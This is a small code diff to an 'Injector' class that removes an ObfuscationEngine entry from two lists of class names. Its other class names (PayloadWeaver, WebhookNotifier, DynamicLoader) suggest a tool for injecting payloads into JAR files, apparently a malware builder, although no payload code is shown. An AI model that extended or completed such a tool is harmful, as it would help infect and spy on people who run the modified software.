@@ -232,8 +232,7 @@ public class Injector {
                 "dev.naruto.astrox.utils.WebhookNotifier",
                 "dev.naruto.astrox.core.JarAnalyzer",
                 "dev.naruto.astrox.core.Injector",
-                "dev.naruto.astrox.core.PayloadWeaver",
-                "dev.naruto.astrox.obfuscation.ObfuscationEngine"
+                "dev.naruto.astrox.core.PayloadWeaver"
         };
 
         SimpleRemapper remapper = new SimpleRemapper(remapTable);
@@ -311,8 +310,7 @@ public class Injector {
                 || className.equals("dev.naruto.astrox.utils.DynamicLoader")    // classloader reflection
                 || className.equals("dev.naruto.astrox.core.JarAnalyzer")       // build-time only
                 || className.equals("dev.naruto.astrox.core.Injector")          // build-time only
-                || className.equals("dev.naruto.astrox.core.PayloadWeaver")     // build-time only
-                || className.equals("dev.naruto.astrox.obfuscation.ObfuscationEngine"); // build-time only
+                || className.equals("dev.naruto.astrox.core.PayloadWeaver");     // build-time only
     }
 
     /**
